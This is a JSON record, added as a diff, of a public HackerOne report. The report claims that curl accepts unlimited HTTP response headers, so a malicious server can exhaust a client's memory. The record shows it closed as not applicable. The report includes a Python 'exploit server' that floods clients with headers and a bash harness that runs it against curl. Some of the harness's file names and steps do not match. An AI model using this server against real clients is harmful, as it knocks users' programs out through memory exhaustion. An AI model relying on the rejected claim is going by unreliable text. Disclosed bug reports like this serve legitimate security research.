@@ -1,0 +1,137 @@
+{
+  "id": 2552192,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNTUyMTky",
+  "url": "https://hackerone.com/reports/2552192",
+  "title": "Denial of Service in curl Request - HTTP headers eat all memory",
+  "state": "Closed",
+  "substate": "not-applicable",
+  "severity_rating": "medium",
+  "readable_substate": "N/A",
+  "created_at": "2024-06-14T09:03:18.409Z",
+  "submitted_at": "2024-06-14T09:03:18.676Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "stux3net08",
+    "url": "/stux3net08",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/8n4i7yflofdlxhkab6jtrps856ov/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2024-06-18T10:51:53.672Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2024-06-15T20:38:52.369Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nCurl's unrestricted header storage lets malicious servers overwhelm memory, leading to out of Memory ( DOS) . When curl retrieves an HTTP response, it stores the incoming headers so that they can be accessed later via the libcurl headers API. However, curl did not have a limit on how many or large headers it would accept in response, allowing a malicious server to stream an endless series of headers and eventually cause curl to run out of heap memory. \n\n** Tested Versions ** \n```\nunfixed in curl 8.7.1 (x86_64-pc-linux-gnu) libcurl/8.7.1 OpenSSL/3.2.2 zlib/1.3.1 brotli/1.1.0 zstd/1.5.5 libidn2/2.3.7 libpsl/0.21.2 libssh2/1.11.0 nghttp2/1.61.0 librtmp/2.3 OpenLDAP/2.5.13\n\nRelease-Date: 2024-03-27, security patched: 8.7.1-5\nProtocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns ldap ldaps mqtt pop3 pop3s rtmp rtsp scp sftp smb smbs smtp smtps telnet tftp\n\nFeatures: alt-svc AsynchDNS brotli GSS-API HSTS HTTP2 HTTPS-proxy IDN IPv6 Kerberos Largefile libz NTLM PSL SPNEGO SSL threadsafe TLS-SRP UnixSockets zstd\n```\n\n**Vulnerability insight**\n\nFrom the breakdown of the below , we can see that the vulnerability is found where cURL cannot limit the number of headers to be stored.\nHeaders are fundamental in HTTP communication, providing metadata and instructions for how requests and responses should be handled (such as Host, Set-Cookie, Content-Type, Content-Length, etc.). Typically, headers are stored directly in memory so that they can be accessed by applications via the libcurl headers API.If cURL does not enforce limits on the number or size of headers, it can lead to memory exhaustion and potential application crashes, causing a denial of service (DoS) attack.\nNow consider this vulnerable code snippet of transfer.c file of cURL's core library. This file handles data transfers, managing the process of sending requests and receiving responses over various protocols (like HTTP, FTP, etc.).\n \n\n## Steps To Reproduce:\n1.  This  is a Python script which creates a simple HTTP server that serves as an exploit server , It is designed to simulate a vulnerability where an excessive number of HTTP headers are sent in the response, potentially causing memory exhaustion on the client side.\n```\nimport http.server\nimport socketserver\n\nclass ExploitHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):\n    def send_headers(self):\n        for i in range(1000000):  # Large number to exhaust heap memory\n            self.send_header(f'X-Excessive-Header-{i}', 'A' * 1000)\n        self.end_headers()\n\n    def do_GET(self):\n        self.send_response(200)\n        self.send_headers()\n        self.wfile.write(b'Exploit server response')\n\ndef run(server_class=http.server.HTTPServer, handler_class=ExploitHTTPRequestHandler, port=8080):\n    server_address = ('', port)\n    httpd = server_class(server_address, handler_class)\n    print(f'Starting exploit server on port {port}')\n    httpd.serve_forever()\n\nif __name__ == '__main__':\n    run()\n```\n\n2 . Next, we create a bash file called  curl_memory.sh. Copy the bash script into the bash file , Below is the bash script. This will be used to run the exploit_server.py file and curl command . \n```\n#!/bin/bash\n# Function to clean up background processes\ncleanup() {\n    kill $EXPLOIT_SERVER_PID\n    exit\n}\n# Trap the exit signal to ensure cleanup\ntrap cleanup EXIT\n# Start the exploit server in the background\npython3 exploit_server.py &\nEXPLOIT_SERVER_PID=$!\n# Allow the server to start\nsleep 2\n# Run curl and capture its PID\ncurl http://localhost:8080 &\nCURL_PID=$!\n# Allow some time for curl to start\nsleep 1\n# Check if the curl process is running and monitor its memory usage\nif ps -p $CURL_PID > /dev/null; then\n    echo \"Monitoring curl (PID: $CURL_PID) memory usage...\"\n    while ps -p $CURL_PID > /dev/null; do\n        ps -o pid,rss,vsize,comm -p $CURL_PID\n        sleep 1\n    done\nelse\n    echo \"Curl process not found\"\nfi\n# Wait for the curl process to complete\nwait $CURL_PID\n# Cleanup\nkill $EXPLOIT_SERVER_PID  \n```\n3. To check the memory while running the script, open another terminal and run.\n```\nhtop\n```\nOnce that is done, we run these commands:\n```\nchmod +x monitor_curl_memory\n./curl_memory\n\n```\n\n```\ndmesg | grep -i \"out of memory\"\n\n```\n\n**Mitigation** \n\n1. Enforce Header Limits: Set restrictions on header size and number using curl options.\n\n2. Review Application Code: Check your code for proper handling of HTTP response headers to prevent memory issues.\n\n3. Network Filtering: Employ firewalls or WAFs to detect and block malicious traffic exploiting this vulnerability.\n\n4. Monitor Memory Usage: Regularly monitor memory usage and set up alerts for abnormal consumption.\n\n\n## Supporting Material/References:\n\nhttps://learn.microsoft.com/en-us/answers/questions/1409035/curl-7-69-(-8-4-0-heap-buffer-overflow-and-curl-7\nhttps://hackerone.com/reports/2072338\n\n## Impact\n\nDOS/overloading of user's system through malicious HTTP server interaction with curl's header parsing.",
+  "weakness": {
+    "id": 120,
+    "name": "Allocation of Resources Without Limits or Throttling"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 3357334,
+      "file_name": "Poc.jpg",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/bz6x0u9e0fklipnnt4v1q43biwwx?response-content-disposition=attachment%3B%20filename%3D%22Poc.jpg%22%3B%20filename%2A%3DUTF-8%27%27Poc.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWI3GZGVT%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T203847Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIDbQKR%2FfiFObgHYnTPTPRMlhh3HFPFJnuyTpfw%2B1RnpfAiEAsWlcH%2F2ziUYH0IsMkC5Bpqvzd15TgKr%2FADmUHmr%2BBdUquwUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDKMRLCrUaB3LZsZKhCqPBQhrbIUZFdN5wBfV40ixwc5jZGSy9qVA%2BvA%2F8UTSm5%2FPErm5lpadq%2BWvkcHja5Wctuk3Vkj%2BS%2Bz8ixXf7qNhgLu0E%2B5CIteqlvJJ%2F%2BUTO4%2BL7Mt2YNwrRzGFCsI1mnIiSjMai%2Bq2OFn9wVMmt1siXquoi9g8NirUxwcxz%2BplMsrDeYgZDR7wvsb5u6f43jftrsD%2Bqlp7VpSKi%2Fdk3R6TD%2B%2BmmneTaqbiD4%2B96DwyENikTGPRb4IZj6YrEeCE0dn85qVx1wJNuaVySJuetgbJaz2o9TVnthvd7fIx3HoAN7n%2BdxBdX0zQoFmJYbXEmeNCYWgiNep18vkAkm3ggdcSN%2FxnCqy9xCAiLD8x2HYbvTFAck5veJg%2BDDpeVP8Aj9lDmkyVcwH3SvrFLRMddNuF0PoFwk3y9T1ukklSaBnlYwd5XqgXiuDgw%2BAlfqrloQIaBE7rLppvgGHwP6p14iccmVDZrWfOj1acOL%2FDRHOEV1N2bNNSF9Zu62EIVpgrOQ78p3HCZytKXwIx3EplincJunDgB%2FyapcxeCBYGAOIRUzncL0O0hal%2FwoOYNzFrVaDBIVa%2Fp9FdIgL3mBwvVKGqCBc%2FJ87jeZ5EORpFClYWUPJXugH%2BQecEdV0iF1%2Fbg64LwO5Lj9rOn49PfBwY%2FUbIQ%2FnKiy7vG7C7Lp2Ilno4sBOdF1TwJz1WC8dLvO7RTUT0gdEsbzHKSG58tumS%2B56CaeC7Z6w20PkzzWoXFekjYs5e%2FGSZUpZB6JAWCSFpr4FdtfW42i%2FwZB7PmSd9TbdfTcHgqIICkUr7XKszYjmnD6GH%2F3hTWT41ve%2BsSpjO7vT0GdEYkxICt4yGxCsdgWwIj9ist3Z4kNO9Y9QjZ9api0Aw%2BrbizAY6sQFDcmhvI8Y1TifTVXY8abOk5owMPcZvSpCTGyBZ4Du73fdXO8X0OgGoAQFyzlUGMB07N7OPtKxM9wArmWBZP7846afusSj%2FJxHeti%2BmIjIrciDPQp0YXIjhmyEYobTWufjewygWJJsSnQYjV6ckw7sX2V9hYXuS5ZEw6NjQQK4I8PiUmXb3LuDoe3zfbmt%2Fkf2YpvL5%2BWUq0EL3uup7YEO5bHmws5eHfLEFkZ1I0csWHuQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7165cba56def568397afd6404703b97fc0783a731ea5c1dbc12a3d3471fe98a2",
+      "file_size": 373095,
+      "type": "image/jpeg",
+      "moderated": false
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 6,
+  "voters": [
+    "zeerosilent",
+    "shubham_srt",
+    "aecherli",
+    "hpahblackcat6",
+    "zabelli",
+    "oleh_durasov"
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 6.3,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "low",
+      "integrity": "low",
+      "availability": "low"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
